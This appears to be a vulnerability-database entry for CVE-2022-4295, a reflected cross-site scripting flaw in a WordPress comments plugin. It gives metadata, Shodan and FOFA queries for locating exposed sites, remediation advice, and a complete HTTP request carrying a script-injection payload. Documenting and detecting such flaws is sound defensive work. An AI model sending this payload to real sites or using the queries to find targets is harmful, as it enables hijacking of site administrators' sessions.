---
layout: "post"
cve_id: "CVE-2022-4295"
title: "Show all comments < 7.0.1 - Cross-Site Scripting"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-4295.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-4295.yaml"
author: "r3Y3r53"
severity: "medium"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the affected website, potentially leading to session hijacking, defacement, or theft of sensitive information.
"
remediation: "Update to the latest version of the Show all comments plugin (7.0.1) or apply the vendor-supplied patch to fix the vulnerability.
"
reference:
  - "https://wpscan.com/vulnerability/4ced1a4d-0c1f-42ad-8473-241c68b92b56"
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-4295"
  - "https://github.com/cyllective/CVEs"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N', 'cvss-score': 6.1, 'cve-id': 'CVE-2022-4295', 'cwe-id': 'CWE-79', 'epss-score': 0.16021, 'epss-percentile': 0.9456, 'cpe': 'cpe:2.3:a:appjetty:show_all_comments:*:*:*:*:*:wordpress:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'appjetty', 'product': 'show_all_comments', 'framework': 'wordpress', 'shodan-query': 'http.html:/wp-content/plugins/show-all-comments-in-one-page', 'fofa-query': 'body=/wp-content/plugins/show-all-comments-in-one-page', 'publicwww-query': '/wp-content/plugins/show-all-comments-in-one-page'}"
tags:
  - "cve2022"
  - "cve"
  - "wpscan"
  - "wp"
  - "wordpress"
  - "wp-plugin"
  - "xss"
  - "show-all-comments-in-one-page"
  - "appjetty"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
The Show All Comments WordPress plugin before 7.0.1 does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against a logged in high privilege users such as admin.


## ðŸŒ HTTP Request
```nohighlight
GET /wp-admin/admin-ajax.php?action=sac_post_type_call&post_type=</option><script>alert(document.domain)</script> HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

